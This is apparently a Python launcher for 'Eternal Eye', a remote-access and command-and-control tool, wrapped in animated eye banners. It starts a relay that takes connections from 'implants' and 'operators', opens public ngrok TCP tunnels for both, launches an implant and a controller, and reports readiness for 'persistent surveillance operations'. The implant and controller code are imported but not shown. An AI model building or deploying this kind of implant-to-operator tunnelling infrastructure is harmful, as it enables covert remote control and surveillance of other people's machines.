


#!/usr/bin/env python3
"""
Eternal Eye - Automated Launcher
With animated eagle eye banner that monitors system status
"""

import os
import sys
import time
import threading
import subprocess
import platform  # MISSING IMPORT ADDED
from pyngrok import ngrok, conf
import json
import webbrowser
import random
from datetime import datetime

class EagleEyeBanner:
    def __init__(self):
        self.is_running = True
        self.has_error = False
        self.current_status = "Initializing..."
        self.colors = ['yellow', 'red', 'orange', 'purple', 'blue', 'green']
        self.color_codes = {
            'yellow': '\033[93m',
            'red': '\033[91m',
            'orange': '\033[38;5;214m',
            'purple': '\033[95m',
            'blue': '\033[94m',
            'green': '\033[92m',
            'reset': '\033[0m'
        }
        self.eye_frames = self.create_eye_frames()
        self.rotation_angle = 0
        self.rotation_text = "Proudly Developed By CVJ The Cyber Wolf"
        self.rotation_chars = "�⢀⣀⣄⣤⣦⣶⣷⣿⣾⣽⣻⣺⣹⣸⣴⣳⣱⣰⣠⣟⣞⣝⣜⣛⣚⣙⣘⣗⣖⣕⣔⣓⣒⣑⣐⣏⣎⣍⣌⣋⣊⣉⣈⣇⣆⣅⣄⣃⣂⣁⡿⡾⡽⡼⡻⡺⡹⡸⡷⡶⡵⡴⡳⡱⡰⡠⡟⡞⡝⡜⡛⡚⡙⡘⡗⡖⡕⡔⡓⡒⡑⡐⡏⡎⡍⡌⡋⡊⡉⡈⡇⡆⡅⡄⡃⡂⡁⠿⠾⠽⠼⠻⠺⠹⠸⠷⠶⠵⠴⠳⠱⠰⠠⠟⠞⠝⠜⠛⠚⠙⠘⠗⠖⠕⠔⠓⠒⠑⠐⠏⠎⠍⠌⠋⠊⠉⠈⠇⠆⠅⠄⠃⠂⠁"
        
    def create_eye_frames(self):
        """Create different frames for the eagle eye animation"""
        return [
            r"""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠉⠉⠉⠉⠉⠉⠉⠛⠶⣤⡀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⠀⠀⠀⠀
    ⠀⠀⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀
    ⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀
    ⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⣠⠴⠒⠛⠛⠛⠳⢦⣄⠀⠀⠀⠀⠀⠀⢧⠀
    ⢰⠃⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠈⢳⡀⠀⠀⠀⠀⠈⣇
    ⣼⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀●⠀⠀ ●⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⢹
    ⡇⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⠀⢸
    ⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣄⣀⠀⠀⣀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀⢸
    ⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
    ⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇
    ⠀⠀⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁
    ⠀⠀⠀⠈⠛⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠚⠁⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠲⠶⠶⠶⠶⠶⠶⠖⠛⠉⠁⠀⠀⠀⠀⠀⠀
            """,
            r"""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠉⠉⠉⠉⠉⠉⠉⠛⠶⣤⡀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⠀⠀⠀⠀
    ⠀⠀⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀
    ⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀
    ⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⣠⠴⠒⠛⠛⠛⠳⢦⣄⠀⠀⠀⠀⠀⠀⢧⠀
    ⢰⠃⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠈⢳⡀⠀⠀⠀⠀⠈⣇
    ⣼⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀◉⠀⠀ ◉⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⢹
    ⡇⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⠀⢸
    ⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣄⣀⠀⠀⣀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀⢸
    ⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
    ⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇
    ⠀⠀⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁
    ⠀⠀⠀⠈⠛⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠚⠁⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠲⠶⠶⠶⠶⠶⠶⠖⠛⠉⠁⠀⠀⠀⠀⠀⠀
            """,
            r"""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠉⠉⠉⠉⠉⠉⠉⠛⠶⣤⡀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⠀⠀⠀⠀
    ⠀⠀⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀
    ⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀
    ⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⣠⠴⠒⠛⠛⠛⠳⢦⣄⠀⠀⠀⠀⠀⠀⢧⠀
    ⢰⠃⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠈⢳⡀⠀⠀⠀⠀⠈⣇
    ⣼⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀◎⠀⠀ ◎⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⢹
    ⡇⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⠀⢸
    ⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣄⣀⠀⠀⣀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀⢸
    ⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
    ⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇
    ⠀⠀⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁
    ⠀⠀⠀⠈⠛⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠚⠁⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠲⠶⠶⠶⠶⠶⠶⠖⠛⠉⠁⠀⠀⠀⠀⠀⠀
            """
        ]
    
    def get_rotating_text(self):
        """Generate the 360° rotating text effect"""
        # Calculate rotation position
        text_length = len(self.rotation_text)
        rotation_pos = int((self.rotation_angle / 360) * text_length)
        
        # Create rotated text
        rotated_text = (self.rotation_text[rotation_pos:] + 
                       self.rotation_text[:rotation_pos])
        
        # Add rotating border characters
        border_char = self.rotation_chars[int(self.rotation_angle) % len(self.rotation_chars)]
        
        # Format the text with rainbow colors
        colored_text = ""
        for i, char in enumerate(rotated_text):
            color_index = (i + int(self.rotation_angle / 10)) % len(self.colors)
            color = self.colors[color_index]
            colored_text += f"{self.get_color(color)}{char}{self.get_color('reset')}"
        
        # Update rotation angle
        self.rotation_angle = (self.rotation_angle + 15) % 360
        
        return f"{border_char} {colored_text} {border_char}"
    
    def create_animated_banner(self, current_frame, current_color):
        """Create the complete animated banner with rotating text"""
        color_code = self.get_color(current_color)
        reset_code = self.get_color('reset')
        
        # Get the rotating text
        rotating_text = self.get_rotating_text()
        
        # Create the banner with rotating text integrated
        banner = f"""
{color_code}
 ███████╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██╗         ███████╗██╗   ██╗███████╗
██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║         ██╔════╝╚██╗ ██╔╝██╔════╝
█████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║         █████╗   ╚████╔╝ █████╗  
██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║         ██╔══╝    ╚██╔╝  ██╔══╝  
███████╗   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║███████╗    ███████╗   ██║   ███████╗
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    ╚══════╝   ╚═╝   ╚══════╝
{reset_code}

{color_code}{current_frame}{reset_code}

{self.get_color('yellow')}          ╔═══════════════════════════════════════════════════╗
          ║                  {rotating_text}                  ║
          ╚═══════════════════════════════════════════════════╝{reset_code}

{self.get_color('green' if not self.has_error else 'red')}🦅 Status: {self.current_status}{reset_code}
{self.get_color('blue')}⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{reset_code}
{self.get_color('purple')}🎯 System: {platform.system()} {platform.release()}{reset_code}

{"="*70}
"""
        return banner
    
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def get_color(self, color_name):
        """Get ANSI color code"""
        return self.color_codes.get(color_name, '\033[0m')
    
    def update_status(self, status):
        """Update the status message"""
        self.current_status = status
    
    def set_error(self, error_msg):
        """Set error state and stop animation"""
        self.has_error = True
        self.current_status = f"❌ ERROR: {error_msg}"
    
    def animate_eye(self):
        """Main animation loop"""
        frame_index = 0
        color_index = 0
        blink_counter = 0
        
        while self.is_running and not self.has_error:
            self.clear_screen()
            
            # Get current color and frame
            current_color = self.colors[color_index]
            current_frame = self.eye_frames[frame_index]
            
            # Display the complete animated banner
            banner = self.create_animated_banner(current_frame, current_color)
            print(banner)
            
            # Update animation
            blink_counter += 1
            if blink_counter % 3 == 0:  # Change frame every 3 cycles
                frame_index = (frame_index + 1) % len(self.eye_frames)
            
            if blink_counter % 6 == 0:  # Change color every 6 cycles
                color_index = (color_index + 1) % len(self.colors)
            
            time.sleep(0.3)  # Control animation speed
        
        # Final state - error or stopped
        if self.has_error:
            self.clear_screen()
            print(self.get_color('red'))
            print(r"    ███████╗██████╗ ██████╗  ██████╗ ██████╗ ")
            print(r"    ██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗")
            print(r"    █████╗  ██████╔╝██████╔╝██║   ██║██████╔╝")
            print(r"    ██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗")
            print(r"    ███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║")
            print(r"    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝")
            print(f"{self.get_color('reset')}")
            print(f"{self.get_color('red')}💥 {self.current_status}{self.get_color('reset')}")
    
    def stop(self):
        """Stop the animation"""
        self.is_running = False

class EternalEyeLauncher:
    def __init__(self):
        self.system = platform.system()
        self.relay_process = None
        self.ngrok_tunnels = {}
        self.connection_info = {}
        self.banner = EagleEyeBanner()
        
    def detect_terminal(self):
        """Detect the best terminal emulator for the system"""
        if self.system == "Windows":
            return "cmd", "/k"
        elif self.system == "Darwin":  # macOS
            return "open", "-a", "Terminal"
        else:  # Linux/Android
            # For Termux (Android), we'll use the current terminal
            if 'ANDROID_ROOT' in os.environ:
                return "termux-open", "--target", "activity"
            for term in ["gnome-terminal", "konsole", "xterm", "terminator"]:
                if self.check_command_exists(term):
                    return term, ""
            return "xterm", ""
    
    def check_command_exists(self, command):
        """Check if a command exists on the system"""
        try:
            subprocess.run([command, "--version"], capture_output=True, check=False)
            return True
        except:
            return False
    
    def install_dependencies(self):
        """Install required Python packages"""
        self.banner.update_status("Installing dependencies...")
        requirements = ["websockets", "psutil", "pyngrok"]
        
        for package in requirements:
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", package], 
                             check=True, capture_output=True)
                self.banner.update_status(f"Installed {package}")
                time.sleep(0.5)
            except subprocess.CalledProcessError:
                self.banner.set_error(f"Failed to install {package}")
                return False
        return True
    
    def setup_ngrok(self):
        """Setup ngrok authentication"""
        self.banner.update_status("Setting up ngrok tunnels...")
        
        try:
            import pyngrok
        except ImportError:
            self.banner.update_status("Installing pyngrok...")
            subprocess.run([sys.executable, "-m", "pip", "install", "pyngrok"], check=True)
        
        # For demo, we'll use community version
        try:
            self.banner.update_status("Authenticating with ngrok...")
            # In production, you'd use: ngrok.set_auth_token("YOUR_TOKEN")
            time.sleep(1)
            self.banner.update_status("Ngrok ready!")
            return True
        except Exception as e:
            self.banner.set_error(f"Ngrok setup failed: {e}")
            return False
    
    def start_relay_server(self):
        """Start the relay server in a new terminal"""
        self.banner.update_status("Starting Eternal Eye relay server...")
        
        relay_script = """
import asyncio
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from relay.server import EternalEyeRelay

async def main():
    server = EternalEyeRelay()
    print("🔮 Eternal Eye Relay Server Started!")
    print("   - Implants connect on port 8765")
    print("   - Operators connect on port 8766")
    await server.start_server()

if __name__ == "__main__":
    asyncio.run(main())
"""
        
        with open("relay_starter.py", "w") as f:
            f.write(relay_script)
        
        terminal_cmd, *terminal_args = self.detect_terminal()
        
        try:
            if self.system == "Windows":
                self.relay_process = subprocess.Popen([terminal_cmd, "/k", "python", "relay_starter.py"])
            elif self.system == "Darwin":
                self.relay_process = subprocess.Popen([
                    "osascript", "-e", 
                    f'tell app "Terminal" to do script "cd {os.getcwd()} && python3 relay_starter.py"'
                ])
            else:  # Linux/Android
                # For Termux, we can't easily open new terminals, so run in background
                if 'ANDROID_ROOT' in os.environ:
                    self.relay_process = subprocess.Popen([
                        sys.executable, "relay_starter.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                else:
                    self.relay_process = subprocess.Popen([
                        terminal_cmd, "--", "bash", "-c", 
                        f"cd {os.getcwd()} && python3 relay_starter.py; exec bash"
                    ])
            
            time.sleep(3)
            self.banner.update_status("Eternal Eye relay server started successfully!")
            return True
            
        except Exception as e:
            self.banner.set_error(f"Failed to start relay: {e}")
            return False
    
    def setup_tunnels(self):
        """Setup ngrok tunnels"""
        self.banner.update_status("Creating secure tunnels...")
        
        try:
            # Create tunnels
            implant_tunnel = ngrok.connect(8765, "tcp", bind_tls=True)
            operator_tunnel = ngrok.connect(8766, "tcp", bind_tls=True)
            
            # Extract connection info
            implant_url = implant_tunnel.public_url.replace("tcp://", "").split(":")
            operator_url = operator_tunnel.public_url.replace("tcp://", "").split(":")
            
            self.ngrok_tunnels = {
                'implant': {'host': implant_url[0], 'port': implant_url[1]},
                'operator': {'host': operator_url[0], 'port': operator_url[1]}
            }
            
            self.connection_info = {
                'implant_host': implant_url[0],
                'implant_port': implant_url[1],
                'operator_host': operator_url[0], 
                'operator_port': operator_url[1],
                'timestamp': time.time()
            }
            
            # Save connection info
            with open("connection_info.json", "w") as f:
                json.dump(self.connection_info, f, indent=2)
            
            self.banner.update_status("Secure tunnels established!")
            time.sleep(1)
            return True
            
        except Exception as e:
            self.banner.set_error(f"Tunnel creation failed: {e}")
            return False
    
    def start_implant_terminal(self):
        """Start implant in a new terminal"""
        self.banner.update_status("Deploying Eternal Eye implant...")
        
        if not self.connection_info:
            self.banner.set_error("No connection info available")
            return False
        
        implant_script = f"""
import asyncio
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from implant.agent import EternalEyeImplant

async def main():
    print("👁️  Eternal Eye Implant Activated!")
    print("   Connecting to relay...")
    implant = EternalEyeImplant('{self.connection_info['implant_host']}', {self.connection_info['implant_port']})
    await implant.run()

if __name__ == "__main__":
    asyncio.run(main())
"""
        
        with open("implant_starter.py", "w") as f:
            f.write(implant_script)
        
        terminal_cmd, *terminal_args = self.detect_terminal()
        
        try:
            if self.system == "Windows":
                subprocess.Popen([terminal_cmd, "/k", "python", "implant_starter.py"])
            elif self.system == "Darwin":
                subprocess.Popen([
                    "osascript", "-e", 
                    f'tell app "Terminal" to do script "cd {os.getcwd()} && python3 implant_starter.py"'
                ])
            else:  # Linux/Android
                if 'ANDROID_ROOT' in os.environ:
                    subprocess.Popen([
                        sys.executable, "implant_starter.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                else:
                    subprocess.Popen([
                        terminal_cmd, "--", "bash", "-c", 
                        f"cd {os.getcwd()} && python3 implant_starter.py; exec bash"
                    ])
            
            self.banner.update_status("Eternal Eye implant deployed!")
            return True
            
        except Exception as e:
            self.banner.set_error(f"Failed to start implant: {e}")
            return False
    
    def start_controller_terminal(self):
        """Start controller in a new terminal"""
        self.banner.update_status("Launching Eternal Eye control center...")
        
        if not self.connection_info:
            self.banner.set_error("No connection info available")
            return False
        
        controller_script = f"""
import asyncio
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from controller.client import EternalEyeController

async def main():
    print("🎛️  Eternal Eye Control Center!")
    print("   Connecting to relay...")
    controller = EternalEyeController('{self.connection_info['operator_host']}', {self.connection_info['operator_port']})
    await controller.run()

if __name__ == "__main__":
    asyncio.run(main())
"""
        
        with open("controller_starter.py", "w") as f:
            f.write(controller_script)
        
        terminal_cmd, *terminal_args = self.detect_terminal()
        
        try:
            if self.system == "Windows":
                subprocess.Popen([terminal_cmd, "/k", "python", "controller_starter.py"])
            elif self.system == "Darwin":
                subprocess.Popen([
                    "osascript", "-e", 
                    f'tell app "Terminal" to do script "cd {os.getcwd()} && python3 controller_starter.py"'
                ])
            else:  # Linux/Android
                if 'ANDROID_ROOT' in os.environ:
                    subprocess.Popen([
                        sys.executable, "controller_starter.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                else:
                    subprocess.Popen([
                        terminal_cmd, "--", "bash", "-c", 
                        f"cd {os.getcwd()} && python3 controller_starter.py; exec bash"
                    ])
            
            self.banner.update_status("Eternal Eye control center active!")
            return True
            
        except Exception as e:
            self.banner.set_error(f"Failed to start controller: {e}")
            return False
    
    def display_success_message(self):
        """Display final success message"""
        self.banner.update_status("Eternal Eye is fully operational!")
        time.sleep(2)
        
        # Final success display
        self.banner.clear_screen()
        print("\033[92m")  # Green color
        print(r"    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
        print(r"    ⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠉⠉⠉⠉⠉⠉⠉⠛⠶⣤⡀⠀⠀⠀⠀⠀⠀")
        print(r"    ⠀⠀⠀⠀⢀⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⠀⠀⠀⠀")
        print(r"    ⠀⠀⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀")
        print(r"    ⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀")
        print(r"    ⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⣠⠴⠒⠛⠛⠛⠳⢦⣄⠀⠀⠀⠀⠀⠀⢧⠀")
        print(r"    ⢰⠃⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠈⢳⡀⠀⠀⠀⠀⠈⣇")
        print(r"    ⣼⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀🟢⠀⠀ 🟢⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⢹")
        print(r"    ⡇⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⠀⢸")
        print(r"    ⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣄⣀⠀⠀⣀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀⢸")
        print(r"    ⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼")
        print(r"    ⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇")
        print(r"    ⠀⠀⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁")
        print(r"    ⠀⠀⠀⠈⠛⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠚⠁⠀⠀")
        print(r"    ⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠲⠶⠶⠶⠶⠶⠶⠖⠛⠉⠁⠀⠀⠀⠀⠀⠀")
        print("\033[0m")
        print("\033[92m✅ ETERNAL EYE - FULLY OPERATIONAL\033[0m")
        print("\033[94m🌐 All systems connected and monitoring\033[0m")
        print("\033[95m🎯 Ready for persistent surveillance operations\033[0m")
        print("\n" + "="*70)
    
    def cleanup(self):
        """Cleanup temporary files"""
        self.banner.update_status("Cleaning up...")
        temp_files = ["relay_starter.py", "implant_starter.py", "controller_starter.py", 
                     "web_interface.py", "connection_info.json"]
        
        for file in temp_files:
            try:
                if os.path.exists(file):
                    os.remove(file)
            except:
                pass
        
        self.banner.stop()
    
    def run(self):
        """Main launcher routine"""
        # Start banner animation in separate thread
        banner_thread = threading.Thread(target=self.banner.animate_eye, daemon=True)
        banner_thread.start()
        
        try:
            # Give banner time to start
            time.sleep(2)
            
            # Step 1: Install dependencies
            if not self.install_dependencies():
                return
            
            # Step 2: Setup ngrok
            if not self.setup_ngrok():
                return
            
            # Step 3: Start relay server
            if not self.start_relay_server():
                return
            
            # Step 4: Setup tunnels
            if not self.setup_tunnels():
                return
            
            # Step 5: Start implant terminal
            if not self.start_implant_terminal():
                return
            
            time.sleep(2)
            
            # Step 6: Start controller terminal  
            if not self.start_controller_terminal():
                return
            
            time.sleep(2)
            
            # Step 7: Display success
            self.display_success_message()
            
            print("\n🎯 Eternal Eye Deployment Complete!")
            print("   All terminals are now active and connected.")
            if self.connection_info:
                print(f"   Implant: {self.connection_info['implant_host']}:{self.connection_info['implant_port']}")
                print(f"   Control: {self.connection_info['operator_host']}:{self.connection_info['operator_port']}")
            
            # Keep main thread alive
            print("\nPress Ctrl+C to shutdown Eternal Eye...")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nShutting down Eternal Eye...")
                
        except KeyboardInterrupt:
            self.banner.set_error("Operation cancelled by user")
        except Exception as e:
            self.banner.set_error(f"Unexpected error: {e}")
        finally:
            self.cleanup()
            print("👁️  Eternal Eye shutdown complete!")

if __name__ == "__main__":
    launcher = EternalEyeLauncher()
    launcher.run()























